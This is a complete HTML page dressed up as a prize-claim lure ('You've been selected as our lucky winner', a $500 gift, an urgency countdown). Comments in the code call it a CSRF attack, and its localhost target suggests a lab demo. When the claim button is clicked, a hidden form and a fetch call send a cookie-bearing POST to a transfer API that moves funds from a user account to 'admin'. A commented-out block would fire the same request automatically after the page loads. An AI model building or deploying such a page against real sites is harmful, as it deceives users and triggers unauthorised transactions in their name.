<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Congratulations Winner!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
            overflow-y: auto;
        }

        /* Floating decorative shapes */
        .shape {
            position: absolute;
            opacity: 0.6;
            animation: float 3s ease-in-out infinite;
        }
        
        .shape:nth-child(1) { top: 10%; left: 5%; animation-delay: 0s; }
        .shape:nth-child(2) { top: 20%; right: 8%; animation-delay: 0.5s; }
        .shape:nth-child(3) { top: 50%; left: 3%; animation-delay: 1s; }
        .shape:nth-child(4) { bottom: 15%; right: 5%; animation-delay: 1.5s; }
        .shape:nth-child(5) { bottom: 30%; left: 8%; animation-delay: 2s; }
        .shape:nth-child(6) { top: 60%; right: 10%; animation-delay: 2.5s; }
        
        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(10deg); }
        }

        .container {
            background: white;
            border-radius: 30px;
            padding: 50px 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            position: relative;
            z-index: 10;
        }

        .trophy {
            font-size: 80px;
            margin-bottom: 20px;
            animation: bounce 1s ease-in-out infinite;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        h1 {
            color: #667eea;
            font-size: 42px;
            font-weight: 700;
            margin-bottom: 15px;
        }

        .subtitle {
            color: #718096;
            font-size: 18px;
            margin-bottom: 35px;
        }

        .gift-box {
            background: linear-gradient(135deg, #ec4899 0%, #f97316 100%);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 25px;
            position: relative;
            overflow: hidden;
        }

        .gift-box::before {
            content: '‚ú®';
            position: absolute;
            top: 15px;
            right: 15px;
            font-size: 40px;
            animation: sparkle 1.5s ease-in-out infinite;
        }

        @keyframes sparkle {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.2); }
        }

        .gift-icon {
            font-size: 36px;
            margin-right: 12px;
            vertical-align: middle;
        }

        .gift-title {
            color: white;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 10px;
        }

        .gift-description {
            color: rgba(255, 255, 255, 0.95);
            font-size: 16px;
        }

        .timer-box {
            background: #fffbeb;
            border: 3px dashed #fbbf24;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 30px;
            position: relative;
        }

        .timer-label {
            color: #92400e;
            font-size: 16px;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .alarm-icon {
            font-size: 20px;
        }

        .countdown {
            color: #dc2626;
            font-size: 42px;
            font-weight: 700;
            font-family: 'Courier New', monospace;
        }

        .claim-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            font-size: 20px;
            font-weight: 700;
            padding: 18px 40px;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .claim-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6);
        }

        .claim-button:active {
            transform: translateY(0);
        }

        .hidden-form {
            display: none;
        }

        /* Decorative shapes */
        .diamond {
            width: 20px;
            height: 20px;
            background: #10b981;
            transform: rotate(45deg);
        }

        .circle {
            width: 20px;
            height: 20px;
            background: #3b82f6;
            border-radius: 50%;
        }

        .square {
            width: 20px;
            height: 20px;
            background: #f59e0b;
        }

        .triangle {
            width: 0;
            height: 0;
            border-left: 10px solid transparent;
            border-right: 10px solid transparent;
            border-bottom: 20px solid #ec4899;
        }
    </style>
</head>
<body>
    <!-- Floating decorative shapes -->
    <div class="shape diamond"></div>
    <div class="shape circle"></div>
    <div class="shape square"></div>
    <div class="shape diamond"></div>
    <div class="shape circle"></div>
    <div class="shape triangle"></div>

    <div class="container">
        <div class="trophy">üèÜ</div>
        <h1>Congratulations!</h1>
        <p class="subtitle">You've been selected as our lucky winner!</p>

        <div class="gift-box">
            <div class="gift-title">
                <span class="gift-icon">üéÅ</span>
                Premium Gift Package
            </div>
            <div class="gift-description">Worth $500 - Claim your exclusive reward now!</div>
        </div>

        <div class="timer-box">
            <div class="timer-label">
                <span class="alarm-icon">‚è∞</span>
                Offer expires in:
            </div>
            <div class="countdown" id="countdown">09:39</div>
        </div>

        <button class="claim-button" onclick="claimGift()">
            CLAIM MY GIFT NOW<span style="margin-left: 8px;">üëà</span>
        </button>
    </div>

    <!-- Hidden CSRF Attack Form -->
    <form id="csrfAttack" class="hidden-form" method="POST" action="http://localhost:5000/api/transfer">
        <input type="hidden" name="fromUserId" value="5">
        <input type="hidden" name="toUsername" value="admin">
        <input type="hidden" name="amount" value="1000">
        <input type="hidden" name="description" value="Gift voucher claim">
    </form>

    <script>
        // Countdown timer
        let timeLeft = 9 * 60 + 39; // 9 minutes 39 seconds
        
        function updateCountdown() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            document.getElementById('countdown').textContent = 
                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            if (timeLeft > 0) {
                timeLeft--;
            } else {
                timeLeft = 9 * 60 + 39; // Reset timer
            }
        }
        
        // Update countdown every second
        setInterval(updateCountdown, 1000);
        
        // Claim gift function - executes CSRF attack
        function claimGift() {
            // Execute CSRF attack using fetch
            fetch('http://localhost:5000/api/transfer', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                credentials: 'include', // Include cookies
                body: JSON.stringify({
                    fromUserId: 5,
                    toUsername: 'admin',
                    amount: 100,
                    description: 'Gift voucher claim'
                })
            })
            .then(response => response.json())
            .then(data => {
                alert('üéâ Congratulations! Your gift is being processed. Please check your account in a few moments.');
            })
            .catch(error => {
                alert('üéâ Your claim has been submitted successfully!');
            });
        }
        
        // Auto-execute attack after 3 seconds
        // window.onload = function() {
        //     setTimeout(claimGift, 3000);
        // };
    </script>
</body>
</html>
